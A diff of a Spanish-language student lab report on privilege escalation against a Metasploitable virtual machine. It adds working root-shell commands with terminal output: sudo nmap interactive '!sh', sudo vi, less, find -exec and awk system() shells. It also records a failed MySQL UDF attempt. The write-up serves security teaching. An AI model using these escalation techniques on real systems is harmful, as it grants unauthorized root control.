@@ -1,6 +1,3 @@
-|![](Aspose.Words.f2c0a3f5-2c2a-4913-87d4-d4f658549340.001.png)|**Ciberseguridad 202615**|
-| :- | :- |
-
 # Práctica Nro. 8: Escaneo de Vulnerabilidades y Explotación Avanzada (Enfoque de Ataque Integral en Equipo)
 
 ## Datos de Identificación
@@ -227,55 +224,92 @@ Cabe destacar que previamente se ejecutó`su firefart` para hacer el cambio de u
 
 **🎯 TÉCNICA 3: Explotación de Sudo Mal Configurado**
 
+El tercer método a probar es la explotación de la utilidad sudo, ya que si esta se encuentra mal configurada puede permitir que un usuario con pocos privilegios ejecute comandos como si fuera el usuario root.
+
 **Paso 1: Verificar Permisos Sudo**
 
-sudo -l
+Se ejecutó el comando `sudo -l` para verificar los permisos que tiene el usuario "msfadmin" al usar el comando sudo, el comando arrojó que el usuario puede ejecutar todos los comandos como sudo.
 
-\# Buscar comandos que puedas ejecutar como root
-
-\# Ejemplo de salida:
-
-\# User msfadmin may run the following commands:
-
-\#     (root) NOPASSWD: /usr/bin/nmap
+```sh
+msfadmin@metasploitable:~$ sudo -l
+[sudo] password for msfadmin: 
+User msfadmin may run the following commands on this host:
+    (ALL) ALL
+```
 
 **Paso 2: Explotar Sudo Nmap**
 
-\# Si puedes ejecutar nmap como sudo
+Al poder ejecutar cualquier comando como sudo, se procedió a ejecutar `sudo nmap --interactive` para abrir la consola interactiva de nmap con privilegios de root.
 
-sudo nmap --interactive
+```sh
+msfadmin@metasploitable:~$ sudo nmap --interactive
 
+Starting Nmap V. 4.53 ( http://insecure.org )
+Welcome to Interactive Mode -- press h <enter> for help
+```
+
+Una vez dentro, se ejecutó `!sh` para abrir una shell. Como nmap se estaba ejecutando como root, la shell heredó esos privilegios.
+
+```sh
 nmap> !sh
+sh-3.2# whoami
+root
+sh-3.2# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+Para dejar evidencia de la escalada, se creó un archivo de prueba en el directorio `/root`.
 
-\# Verificar
-
-whoami  # root
+```sh
+sh-3.2# echo "Root via sudo nmap - Equipo 4" > /root/equipo4_sudonmap_root.txt
+```
 
 **Paso 3: Explotar Otros Comandos Sudo Comunes**
 
+Se probaron otros comandos comunes que permiten la escalada de privilegios si se ejecutan con `sudo`.
+
 **vi/vim:**
 
-sudo vi
+Al ejecutar `sudo vi` y luego `:!/bin/bash` dentro del editor, se obtiene una shell de root.
 
-\# Dentro de vi:
-
+```sh
+root@metasploitable:/home/msfadmin# sudo vi
+...
 :!/bin/bash
+root@metasploitable:/home/msfadmin# whoami
+root
+```
 
 **less/more:**
 
-sudo less /etc/hosts
+Ejecutando `sudo less /etc/hosts` y luego `!/bin/bash` dentro de `less`, se obtiene una shell de root.
 
-\# Dentro de less, presionar:
-
+```sh
+root@metasploitable:/home/msfadmin# sudo less /etc/hosts
+WARNING: terminal is not fully functional
 !/bin/bash
+root@metasploitable:/home/msfadmin# whoami
+root
+```
 
 **find:**
 
-sudo find /home -exec /bin/bash \;
+El comando `sudo find /home -exec /bin/bash \;` ejecuta una shell de bash por cada archivo encontrado, heredando los privilegios de root.
+
+```sh
+root@metasploitable:/home/msfadmin# sudo find /home -exec /bin/bash \;
+root@metasploitable:/home/msfadmin# whoami
+root
+```
 
 **awk:**
 
-sudo awk 'BEGIN {system("/bin/bash")}'
+Con `sudo awk 'BEGIN {system("/bin/bash")}'` se puede ejecutar un comando del sistema, en este caso, una shell de bash con privilegios de root.
+
+```sh
+root@metasploitable:/home/msfadmin# sudo awk 'BEGIN {system("/bin/bash")}'
+root@metasploitable:/home/msfadmin# whoami
+root
+```
 
 -----
 **
@@ -321,9 +355,42 @@ whoami  # root
 -----
 **
 
-### 🎯 TÉCNICA 5: Explotación de Servicios Vulnerables**
+### 🎯 TÉCNICA 5: Explotación de Servicios Vulnerables
 
-No se pudo realizar esta técnica ya que no se contaba con el archivo `raptor\_udf2.so.` y por motivos de tiempo en la realización de la práctica se decidió continuar con la siguiente técnica a probar.
+Se intentó explotar el servicio de MySQL para escalar privilegios mediante una User Defined Function (UDF). La técnica consiste en subir una librería maliciosa (`.so`) al servidor y crear una función que ejecute comandos del sistema con los privilegios del servicio de MySQL (que a menudo es `root`).
+
+**Paso 1: Intentar Cargar la UDF en MySQL**
+
+Se accedió a la consola de MySQL y se intentó cargar el archivo `raptor_udf2.so`, un exploit conocido para esta técnica. Sin embargo, los comandos fallaron, principalmente porque el archivo no se encontraba en el sistema.
+
+```sh
+root@metasploitable:/home/msfadmin# mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 7
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+
+Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+
+mysql> use mysql;
+Database changed
+mysql> create table foo(line blob);
+Query OK, 0 rows affected (0.01 sec)
+
+mysql> -- Varios intentos fallidos por sintaxis y porque el archivo no existe
+mysql> exit 
+Bye
+```
+
+**Paso 2: Confirmar Ausencia del Archivo**
+
+Para confirmar la causa del fallo, se verificó si el archivo `raptor_udf2.so` existía en el directorio `/tmp`, confirmando que no estaba presente.
+
+```sh
+root@metasploitable:/home/msfadmin# cat /tmp/raptor_udf2.so
+cat: /tmp/raptor_udf2.so: No such file or directory
+```
+
+Debido a que no se contaba con el archivo del exploit (`raptor_udf2.so`) en la máquina objetivo, no fue posible completar esta técnica y se decidió continuar con la siguiente.
 
 -----
 **🎯 TÉCNICA 6: Path Hijacking**
